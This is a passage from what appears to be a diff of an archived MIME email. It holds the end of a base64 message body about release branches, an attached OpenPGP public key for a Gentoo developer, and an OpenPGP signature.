+Zm9ybSBhbiBhZGRpdGlvbmFsIHJlbGVhc2UgZnJvbSB0aGVzZQ0KIMKgIGJyYW5jaGVzLg0KDQo=
 
---------------ij6TTlDZPiBme4myj3pEvvaH--
+--------------LBCVECTf6Od08JZLbdP0gJVE
+Content-Type: application/pgp-keys; name="OpenPGP_0x6B75D939B424C6D4.asc"
+Content-Disposition: attachment; filename="OpenPGP_0x6B75D939B424C6D4.asc"
+Content-Description: OpenPGP public key
+Content-Transfer-Encoding: quoted-printable
 
+-----BEGIN PGP PUBLIC KEY BLOCK-----=0A=
+=0A=
+xsFNBGFpBPQBEACaRxGb+O+Ypgxi2gg3bfkxuejyTGUYJ3dwXkoFnZvaSeq7Nx6X=0A=
+4+vEd20x/9vjuwdbXB5w3Tb4N9oIAGUpukjzVX3rBZ9TqkvOiY5KpJf8lJVCJupp=0A=
+lfUkxurWEvwdcCv9KU7HyFSKcMdmFIOGPzbg4N/d2gF52HIKTQBorI0dMAoKsBXu=0A=
+Wfb1/rK+C8wcY3gecqLgrjEdOFsQETFFSUs8Egn3Z81DMoNucBVZWnz+p7R6nhlr=0A=
+Mt9gXNBEZWPFZihteE6EovP6BXSotdyBRmmxAOBCaZZsA4CIzZoK9cb84N6y1PQH=0A=
+AAl4W7wCoakiKByF9/0gCIIbYWgauJ5oD0kQTNgwNDcygQnTdrs7UQ6GUlaT4Cgf=0A=
+eRWydLmmv8LvJyZOqFQs+3DOUTagTYZqsarfBBQO9PaeZvKbz3s5Dsr5QCeOMIVy=0A=
+4Te4tNRNExut48cp+n31ZUARCAlQHAoKiswELCkOgnKzSEVJ8PEeIYP8Up5zoWfK=0A=
+4/SaqeVrY3ziKl8RdOGW2zW7WikfgWODIp5L6erTnT2xRGGcikDbShkGzOQCIkfm=0A=
+XPzp8HmSHumIEO002KzCMsRX8jQphEPtC1QXsAwDpyYMTPjxPIvVtTQbrtoJoYCV=0A=
+uzDiETsB9VWvNRXn687uvVaFL96aui0hLO79basRPiekRp33IlXuEaxVdQARAQAB=0A=
+zR5KYXkgRmF1bGtuZXIgPGpheWZAZ2VudG9vLm9yZz7CwZcEEwEIAEECGwMFCwkI=0A=
+BwICIgIGFQoJCAsCBBYCAwECHgcCF4AWIQS8XViawYtJi5aoT61rddk5tCTG1AUC=0A=
+aMs9igUJDAS+lgAKCRBrddk5tCTG1CQdD/47lPT8z3bbBxlu9zBu4kwDBvrN1wRA=0A=
+ARwAoKE02yKiWDkYt0XqNFuAeGK5gXt+nTqHDHVmHCvDsh13CHKiZL21ZxqX8I4z=0A=
+IvuqVfHdLJ36k161qUtn/vb78kmFNqITgGmU2TfcdRCGY8lgycRbr7Z0EGOIWNlD=0A=
+u0hzE7tU0JOY2lJSeBfvq7MAAuGTy3uL1dQCZmwf8tH2u02AprfATcVz0DfwPKRl=0A=
+E/Ku4cXnLTsje2QSz3SjF0tsbUhohLipfuI5yJQaCwILHzWrMv+bX+wzO4qoUale=0A=
+ozfiCuXwHaC5XqGL4XPrTHT4IzhuURtbf6PsMvnCDTTEntajvm1veZuH+ONMkq73=0A=
+Do56v1JOXJIvpCniXlLiBu3BehCZfRolG/aeF66hkYUF9kaugsXizqbjiQ8Lljjc=0A=
++YfGGOip6+1bhWE7qFaD+JzpVkDgJfO3gEqZlHhJsWm3GpRIpFElXAC+vits5XVJ=0A=
+ccRikHkeHLBaoUk592yRtxOQ0hIwUy6/zWhVcbv05u79ofd5WfpC0vxy1YSbYYGN=0A=
+2BZL91aZKf97GXSNVTavbXQ8mhLTQbpL2ClF6k/KQISZV9629qkhVecbbS4H9W0A=0A=
+Ce3ivVZ+FhLRCQ85huJ81YrJcecDlBNN8Ytojq5ZIEht6KCsZVngsNAOW27yxNzt=0A=
+I3Dh/PfnO+MTas0ZSmF5IEZhdWxrbmVyIDxqYXlAanZmLmNjPsLBlAQTAQgAPgIb=0A=
+AwULCQgHAgYVCgkICwIEFgIDAQIeAQIXgBYhBLxdWJrBi0mLlqhPrWt12Tm0JMbU=0A=
+BQJoyz2KBQkMBL6WAAoJEGt12Tm0JMbUXfYP+QGRxf0ICu3BR44gj24keIyqPjvC=0A=
+5TUega/ioHR2db3KJSfWqij5El6gAJBEAY5HW04KkRv2ru2BOmdz2+5vA/FimM5/=0A=
+si4LC0MvokxZ0QUqUFZI5/UmHsog9pH+lAJPs2ObzCE3mY0g0RDtziqnIyZNpw7z=0A=
+sxP6Y3A4vl+tXAeUuZ6r88vbesEHdWy6w6dgwH5LvWGsPe9vPn/Lyo/nB+ITh5HK=0A=
+6xgjuuRldNL/iYBu6Ph89wUxrEYRwkIXd63RkzYcZLu+l+G2AnopCvMUAXJQn1JM=0A=
+DJkRjLHknVAvWUslFOO3M0Hhs+Wa0V6ACWu5VDCu3gEuIaSfFmsS07WmGeqACTHk=0A=
+8/ovUoxLYz7xydReuYYoz2g0FKoAywb2HOuwXt7+dfu+Zvj50UIIltf6wVv0cj+M=0A=
+hSPI7sCN9C2kx5RzItee5VUGS2fB+46YUukxUVNgSorLfFauxtRXlbGv5ZQr3esB=0A=
+4Ll2TpP5Wd/WxdztQG5SYH5+qeUVWEb9JVVMgx3VN+bpne2axHpBp1Mj3viKXR+s=0A=
+pudGPwtFj+imrZXmA0R848a1JQn5pBuCjXDK7CljNw2LQiZUdcIVMi1kmYYNEOSj=0A=
+iB/h3cMvF07gAkhZw/K8ZefqC+z2k6ZieVrlwMC5eoRcPyfbT22F5VxGj9o+ckjH=0A=
+isvo4o0fqpuKmT8swsGUBBMBCAA+FiEEvF1YmsGLSYuWqE+ta3XZObQkxtQFAmFp=0A=
+BPQCGwMFCQeEzgAFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQa3XZObQkxtSX=0A=
+QQ//VwFbzIE2x79AhX3wHReYH+6UR0qe+QuTl0zd3vp1sKukkbU+i3J4eVHmVXdT=0A=
+I2rFE1WH9TbTaEBM3qZJgXsQEQ5+im+eyZFfZbGgZLJWyig3uKOogS0OrxOjRwjl=0A=
+DLN9Orcl4de/HA1zAVrLRV3zfg8ZMj6zXrv84L54lZ5e9C7mD5oS8Ge5enFrU9kE=0A=
+dHNjqzt1PCXCeA37/HRJoR+nzHmcSzJyMMxQdo0cgiaRHYyu7LOJFL5qR0jLEmZw=0A=
+Eulmd6fMeU4Tx5eMx4o6O3diTmGyeFs/UDGWn0qcMDkh9T00Qw1bLOv/yFrpCMjE=0A=
+yryR7hJ53HYtLqEkvn/7lClrp2BUsV8XjYqexnB6unr30/RduC6koXXUHAZpk/+m=0A=
+D0WEdShFNuiFlOn8BDjBvk5k6j2VlEO3uH0BhWUBfY+bahWiLgWUhupK2Wd8qLYb=0A=
+E9VDj5jvcKVt7qonBuguDY43aXyf7gnm3u1pprGuqTcWyRijHeLXLHNZg2fCUjQ0=0A=
+tdto/YblvNexrEDxjK7nzgmHR7KDTVFcjG91yrTrO2/hmREQSN5WWk50q6n5NLBS=0A=
+MWyDuzOxG0baOuKZrSCnMamFNjMPvAnCdqe1HoNq4b7Hb9FheqJulqQFLEhGN33K=0A=
+IummGYTjJBYnz4L7c1F0iqlvEVO7MEir+a63lMWh6wIarg3OwU0EYWkE9AEQALHc=0A=
+nXwEWn5WF3y47vkl4ASUisl1QHSlYrs1qlsBmqdbQzo5TOtupuGVk9G7jqo1J1Iu=0A=
++ejI+uYCcU1jPYH5H+PJ9AK5qcM6MGniwJNaopHmvUgERwlUcxP99IH4LGS2npnX=0A=
+SxIrSYfYBXuDUW7vbW2Ksj5XfXlBMd/6PE4b5kljOABB9SWFw3eXJunaV7h2tLne=0A=
+wqFU/sbZHLhDkAER7vwlXyTMDrkPTCyOqfweFZcn2iRD52/LsoL4hlpcGZz/mSV/=0A=
+sQJBoiM5op+3NWKKe0V4RkJ+lgACQG4jzC5jyN4XOk48tQF4ZHqyy32O+HRH4xRX=0A=
+pOAmxiZzvXLPUqSmI+uNnjyO5tzFy8K/hzL/3YtXQyxVGFYtmtILSnQORO/a37or=0A=
+eb5RQm8jvvq7R+Id2/BmdekGcxQn5l6gn4+DVyp5EW/n7wXKz5bdt74OFk6RQafb=0A=
+24RHsNbJehIHWDuK2PO5FS6T3T5S2il2khGg2wu6xh5vXyWtB3eW1skdOWwt/M/H=0A=
+FinesaCkvHTUJwTKk6BnQUzpKHyZcGRuQ+pnT/5xJumi6AztsXU29wfyaoZK1o6f=0A=
+oRRk8ojpIVZIUZyR7cV2BXzewwKyv9HihGa+P4atcjPMsGhVh6cJXxKS1xKdfn8i=0A=
+BD7ngS1LIOhDKzjQrRD7Pz/Q0SxwYgYrz51AdH7tABEBAAHCwXwEGAEIACYCGwwW=0A=
+IQS8XViawYtJi5aoT61rddk5tCTG1AUCaMs9fQUJDAS+iQAKCRBrddk5tCTG1OiG=0A=
+D/0dV4IeXX4rBG++DPiW3ZZZU5tCZjrTUIhi6KNilESLvBB5ovrdOPgrJ21CKrQX=0A=
+D9RlLTl8c5OUUaYNP0cOUx97d01ZmfquIauJbXBXWC9XiDWoUEY2eJFfMmb0EW7m=0A=
+4WU/Ot2HjOX/8U8iWW59bL8ONyAg2J/fLaFqJtLkjtqZIeoUvHO+SC5p2EYfMwms=0A=
+xIZzmtvPtLclVRvFUuJIEz9vNLCAarxas+peQ+t2FbyMvrsPISxCZ4axGZ+P+FII=0A=
+FEfckeFwYJEsVeKhj52U05wvPrsZfJIGO4KZ97PsWTNggFUCXhiYkTPoYsXnv09F=0A=
+CDeum6tFM1yGmaD5siLWI8dZdJOIhrMstYDMRlHDoQPOcugRCVv/I0rtKJ1OFG4P=0A=
+Lqbx3aR1cKYyTkpG3GtkM6rSThYFx6N4UKVE9ncCXgjyOHXglWI1BnRqzd86prEd=0A=
+evSVpaasxZjJMta6LbC6PU5Vd/ETNcnJIVsf8zLCoHx7cTmDHHoAU3rELhq5vyWm=0A=
+EpPU3zf0EnbgGXnj+C71yAdmIj04fCt6d2vnM+0nHFL7S3BB18JMpwfJbs0PPair=0A=
+KVQwhPcEWmY6u8pI1J37vTG4MrABj1qZzKJ9SnkwRU1h6uVPdsom0dOzMl+arjW1=0A=
+yZEeXN3xGPq7s2ozyhrYR475/Pvk/G+B/HiUSR3sLybbUc7ATQRnx8pTAQgAvzTh=0A=
+wcbjjoTY/Y95MBW77xGoCVrv2H1Vm36liU18LVQ15RkgsDZv/sLXN9MmUc79Dazn=0A=
+0T0I4Q3po/Micd4ka++dFUGzY0yk+VyrNJG8ibtl0/a6kNInzqUPH52yGDPWu08Y=0A=
+1Y6NAYDBmo7ePqXncZeGevKFsOGtHPV83mRIwyGPN4QOk2h3xOZ72Y3wKrGdBUIT=0A=
++rdetAngzRaqdqyZkzvKzPB6zvEDnJOost1BDZ9FMECAJ+7MnayYE3Ytq5m/+12R=0A=
+b4IUHsVbmi914wrvO2LJCN1hS+yCEazMhgkVXJ0f4wO+ISYAoGyrBrRZE1BplEjt=0A=
+aHB69QMCNqYMih7tTQARAQABwsKyBBgBCAAmAhsCFiEEvF1YmsGLSYuWqE+ta3XZ=0A=
+ObQkxtQFAmjLPX0FCQWl+SoBQMB0IAQZAQgAHRYhBLDzBOkQOEyJiV8Bvs1FRFIp=0A=
+C0VqBQJnx8pTAAoJEM1FRFIpC0VqxMQIAInaBNwQt7qPulrEE18uHf6RyZLAI3l/=0A=
+0n3r40Cd8S9NKjAu/bnHGu0memat5YZOhot7I2tvKlNHRzPTBV+yK1rhbZH8QCwV=0A=
+s/yksTL8kJhWNm/svXRDWYv4zImTwYqB+RPSwAd2eJnknSa5xY/gOr88JKZyjlYx=0A=
+ILyC9Dp7Vo0j9GaXhr796QOKsop4BqEew4HgIkY2+79WGb0BOfAiW2pa0PNf5rn6=0A=
+vTAdmoHDgpeJytyFPTaU5N2Zdhq9c4igUW7H7t3D3M9km+1yRCoNMywVZE1mypvF=0A=
+h8ibNttffwCNw4beaGd9ePmcu0RoepG2PBCuJ5/yJOhvKCM9zmwbU3EJEGt12Tm0=0A=
+JMbULzsP/3VLk57bYrsVgLHGB+IzmvZfM6cd6K1kSa0iE3tHFd2yDGLvQ5S8PaUJ=0A=
+LZGqI9nYX0l6XkRUalU7luPB8f/wlAGnLRIoq/lCnYhmrZzAHGOq7MdKw4poK6Yk=0A=
+3vXrxMyjR1aIeARQkNDGDRmnjBM8o+ldQj9LB/ra56T21A2nk/2LGsN7CjKSlQ0p=0A=
+WIgRHEVCsSCpBDlA2vegfU1P5l5aLZuu7gZewtx7EK4hBTZiI4oTSGe4QeEkX/yA=0A=
+uXkoRHA/kdcyl0Jb9M+Xa5fZ0/m6v5lM8wJtdkByVp6wWIr9KuQQmLdedJA4dU5a=0A=
+o+7OIAJB7vVUWDu1Z3HuUSAPZe1gru2hjdD7LsU6DfjI5GMqSKKYtvTfd5hWvEEX=0A=
+mEIAkIaN9SDjH7gqcb/0WCGJIVvmx6OtcU4ndMxrNEsHljF8sI0+bu4q8serswz7=0A=
+wU0SYIqcsgLVqJaEMMKUisxhz/jycJ1yikLR+TRr3srFTEnhgS1j/cDLOLzoK6Gj=0A=
+783ny5uWumnPPgzYPtOZMz7GSflsirdYPUW4TZEwPwBKutu1p11fPWPWj0pi3bZ1=0A=
+VDf3xur65x3TpbXjyhiaKZE50HR3mPHn2Sm/8Q+9ergC7QJ18Wh13aQqHoH8n4aP=0A=
+N9B6kDLrB1xhe5UKYi1shLeKXdjDO9SPgB/FPq/hue1yvwVEuNn2=0A=
+=3DtvZI=0A=
+-----END PGP PUBLIC KEY BLOCK-----=0A=
+
+--------------LBCVECTf6Od08JZLbdP0gJVE--
+
+--------------85900kXHvSXpfJ4CQ2jKwslx--
+
+--------------EXc6fZAy02UVaSfnoSY8t06A
+Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="OpenPGP_signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+wsB5BAABCAAjFiEEsPME6RA4TImJXwG+zUVEUikLRWoFAmogVloFAwAAAAAACgkQzUVEUikLRWqn
+lgf/fhwLrXUSA/GXDCxOOg+/NGt+zq/JNCqVCyn9u1A2FYvyhUDt2+cf6SxLc8axUpwgOJh0/v0h
+vbQUT9/61ubyOuxgVPojMdQ50rT8un3NKPqGdQjYniYLruwXcRLmPGOrMGyx+MjqvS1g4czauIT6
+CxxDcNj66Ok/4UPl8LYDOo02YpBnW4/PTRd+b4mc3f1AeQOKRfdcnMYdZu0TfBL6y1K84Y6KAqmS
+BOaB16xaSY+GttLg/Ksc4j6J5ISPXjtXmlNI/yqbTrbLprAMtbFozJLHqTRzG2GuZScVfp6YY96A
++PTF9Olqu+GF3LAbTlGGVo53D5DxrS3KNSpYipVFKg==
+=gCQy
+-----END PGP SIGNATURE-----
+
+--------------EXc6fZAy02UVaSfnoSY8t06A--
